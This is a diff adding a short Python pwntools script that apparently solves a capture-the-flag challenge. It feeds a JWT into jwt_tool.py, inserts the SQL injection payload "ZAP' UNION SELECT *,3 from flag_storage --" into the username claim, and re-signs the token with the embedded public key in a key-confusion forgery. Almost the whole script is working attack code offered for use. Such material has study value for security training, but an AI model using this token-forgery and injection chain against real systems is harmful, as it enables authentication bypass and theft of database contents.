@@ -1,0 +1,23 @@
+#!/usr/bin/env python3
+from pwn import *
+
+io = process('sh')
+
+io.sendline('./jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlpBUCIsInBrIjoiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsImlhdCI6MTU5Nzk1MzkwN30.RYtHte7pKWU6YcdgiJuudw9QL0yPGep4A_5_uNCEQXYmLX9P7cEgobkjKKx2WCdOptHEsCBJTsH18ce4wo5zws4yLicrK30UsDsTEDYLWgByg2vlWndfmn12C2mwmfQd4iQDBAz_dXKGLls4Vxo_jGOSXenZs_5tCXUTmZnK6MzY-aHz4URtfQEaxWrCX1Wm5qCXqnV5nIz5sQFhyfuKY_0cprpKVeCgdcSRnrzKQ91JgcSNLmMyMg9CyJeLF8VPz_j-M85EgOuZiTO3oRc709fcgTNcOUDivE6kcdP1uMz4rnKLk-xkSPtgFuyZs9nvCtehLWucV8O3GiUYy1hJPg')
+
+io.recvrepeat(1)
+
+io.sendline('1')
+io.recvrepeat(1)
+io.sendline('0')
+io.recvrepeat(1)
+io.sendline('1')
+io.recvrepeat(1)
+io.sendline("ZAP' UNION SELECT *,3 from flag_storage --")
+io.recvrepeat(1)
+io.sendline('0')
+io.recvrepeat(1)
+io.sendline('4')
+io.recvrepeat(1)
+io.sendline('publickey')
+print(io.recvrepeat(1).decode())
